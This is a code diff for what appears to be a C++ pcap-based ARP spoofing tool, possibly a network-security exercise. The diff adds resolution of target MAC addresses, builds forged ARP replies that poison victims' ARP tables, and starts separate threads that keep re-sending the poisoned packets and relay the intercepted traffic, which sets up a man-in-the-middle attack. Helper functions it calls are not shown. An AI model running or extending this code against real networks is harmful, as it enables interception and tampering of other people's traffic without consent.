@@ -12,8 +12,10 @@ int main (int argc, char *argv[], char *envp[]) {
     uint32_t *sender_ip = NULL;
     uint32_t *target_ip = NULL;
     uint8_t my_mac[6];
+    uint8_t **g_mac;
     uint32_t my_ip;
     int i, j;
+    int loop;
     struct pcap_pkthdr* header;
     const uint8_t *data;
     arp *packet;
@@ -22,21 +24,23 @@ int main (int argc, char *argv[], char *envp[]) {
 
     setvbuf(stdout, 0LL, 1, 0LL);
     setvbuf(stderr, 0LL, 1, 0LL);
-
     if(argc < 4 || argc % 2) {
         usage();
         return -1;
     }
-    sender_ip = (uint32_t*)malloc(sizeof(uint32_t) * (argc - 2) / 2);
-    target_ip = (uint32_t*)malloc(sizeof(uint32_t) * (argc - 2) / 2);
-    infecting = (arp**)malloc(sizeof(arp*) * (argc - 2) / 2);
-    if(!sender_ip || !target_ip || !infecting) {
+    loop = (argc - 2) / 2;
+    sender_ip = (uint32_t*)malloc(sizeof(uint32_t) * loop);
+    target_ip = (uint32_t*)malloc(sizeof(uint32_t) * loop);
+    g_mac = (uint8_t **)malloc(sizeof(uint8_t*) * loop);
+    infecting = (arp**)malloc(sizeof(arp*) * loop);
+    if(!sender_ip || !target_ip || !infecting || !g_mac) {
         fprintf(stderr, "Malloc error.\n");
         return -1;
     }
-    for (i = 0; i < (argc - 2) / 2; ++i) {
+    for (i = 0; i < loop; ++i) {
         infecting[i] = (arp*)malloc(sizeof(arp) + 1);
-        if(!infecting[i]) {
+        g_mac[i] = (uint8_t*)malloc(sizeof(uint8_t)*6 + 1);
+        if(!infecting[i] || !g_mac[i]) {
             fprintf(stderr, "Malloc error.\n");
             return -1;
         }
@@ -63,8 +67,18 @@ int main (int argc, char *argv[], char *envp[]) {
 
     printf("MY MAC ADDRESS: %02x:%02x:%02x:%02x:%02x:%02x\n", my_mac[0], my_mac[1], my_mac[2], my_mac[3], my_mac[4], my_mac[5]);
     printf("MY IP  ADDRESS: %d.%d.%d.%d\n", my_ip & 0xff, my_ip >> 8 & 0xff, my_ip >> 16 & 0xff, my_ip >> 24 & 0xff);
-
-    for(i = 0; i < (argc - 2) / 2; ++i) {
+    
+    for(i = 0; i < loop; ++i) {
+        set_arp(send, my_mac, (uint8_t*)"\xff\xff\xff\xff\xff\xff", REQUEST, 
+            my_mac, my_ip, (uint8_t*)"\0\0\0\0\0\0", target_ip[i]);
+        packet = resolve_target_arp(pcap, &header, &data, send);
+        if(!packet) {
+            fprintf(stderr, "Can't resolve target arp packet :(\n");
+            return -1;
+        }
+        memcpy(g_mac[i], packet->sender_mac, 6);
+    }
+    for(i = 0; i < loop; ++i) {
         set_arp(send, my_mac, (uint8_t*)"\xff\xff\xff\xff\xff\xff", REQUEST, 
             my_mac, my_ip, (uint8_t*)"\0\0\0\0\0\0", sender_ip[i]);
         packet = resolve_target_arp(pcap, &header, &data, send);
@@ -75,11 +89,11 @@ int main (int argc, char *argv[], char *envp[]) {
         set_arp(infecting[i], my_mac, packet->sender_mac, REPLY, my_mac, 
                     target_ip[i], packet->sender_mac, sender_ip[i]);
     }
-    while(true) {
-        for(i = 0; i < (argc - 2) / 2; ++i) 
-            pcap_sendpacket(pcap, (u_char*)infecting[i], sizeof(arp));
-        sleep(10);
-        puts("ARP TABLE INFECTING....");
-    }
+    std::thread inf_th = std::thread(infecting_routine, pcap, loop, infecting);
+    std::thread relay_th = std::thread(relay_routine, pcap, loop, infecting,
+        sender_ip, my_mac, g_mac, my_ip);
+    signal(SIGINT, (__sighandler_t)handler);
+    inf_th.join();
+    relay_th.join();
 }
 
